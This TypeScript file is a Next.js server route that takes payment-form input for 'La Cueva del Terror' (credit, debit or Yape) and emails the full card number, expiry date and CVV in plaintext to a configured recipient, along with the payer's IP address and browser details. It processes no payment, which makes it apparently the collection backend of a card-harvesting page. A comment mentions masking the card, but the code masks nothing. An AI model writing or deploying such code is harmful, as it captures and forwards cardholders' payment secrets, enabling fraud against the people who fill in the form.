import { NextResponse } from "next/server";
import nodemailer from "nodemailer";

export const runtime = "nodejs";

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { type, monto, datos, originPage } = body;

    // Info adicional
    const ip =
      req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
      req.headers.get("x-real-ip") ||
      "IP no disponible";

    const userAgent = req.headers.get("user-agent") || "User-Agent no disponible";

    // Fecha en timezone Lima
    const fecha = new Date().toLocaleString("es-PE", {
      timeZone: "America/Lima",
      hour12: false,
    });

    const subjectMap: Record<string, string> = {
      credito: "🧾 Nuevo pago con Tarjeta de CRÉDITO",
      debito: "🧾 Nuevo pago con Tarjeta de DÉBITO",
      yape: "🧾 Nuevo pago con Yape",
    };

    // Construimos la sección de datos (incluye cvv y vencimiento si vienen)
    const detalleDatos = {
      ...datos,
      // si quieres asegurarte de que tarjeta esté enmascarada:
      tarjeta: datos?.tarjeta ?? "no disponible",
      vencimiento: datos?.vencimiento ?? "no disponible",
      cvv: datos?.cvv ?? "no disponible",
    };

    const html = `
      <div style="font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;color:#111;max-width:650px;margin:auto;">
        <h2>${subjectMap[type] || "🧾 Nuevo pago recibido"}</h2>

        <p><b>🕓 Fecha y hora:</b> ${fecha}</p>
        <p><b>💰 Monto:</b> S/. ${monto}</p>
        <p><b>📍 Origen:</b> ${originPage}</p>

        <hr style="border:none;border-top:1px solid #ddd;margin:16px 0;">
        <h3 style="margin-bottom:6px;">🧾 Datos ingresados:</h3>
        <pre style="background:#f7f7f7;border:1px solid #ddd;border-radius:6px;padding:12px;font-size:13px;line-height:1.4;white-space:pre-wrap;">
${JSON.stringify(detalleDatos, null, 2)}
        </pre>

        <hr style="border:none;border-top:1px solid #ddd;margin:16px 0;">
        <h3 style="margin-bottom:6px;">🌐 Información del cliente:</h3>
        <p><b>IP:</b> ${ip}</p>
        <p><b>Navegador / Sistema:</b> ${userAgent}</p>

        <hr style="border:none;border-top:1px solid #ddd;margin:16px 0;">
        <p style="font-size:12px;color:#777;text-align:center;">
          Correo automático generado desde el formulario de pago de <b>La Cueva del Terror</b>.
        </p>
      </div>
    `;

    // Transport SMTP (Gmail)
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: Number(process.env.SMTP_PORT),
      secure: false,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
    });

    // Verifica (opcional) la conexión y envía
    await transporter.verify();
    const info = await transporter.sendMail({
      from: process.env.FROM_EMAIL,
      to: process.env.RECIPIENT_EMAIL,
      subject: subjectMap[type] || "Nuevo pago recibido",
      html,
    });

    console.log("✅ Correo enviado:", info.messageId);
    return NextResponse.json({ ok: true });
  } catch (error) {
    console.error("❌ Error enviando correo:", error);
    return NextResponse.json({ ok: false, error: "Error enviando correo" }, { status: 500 });
  }
}
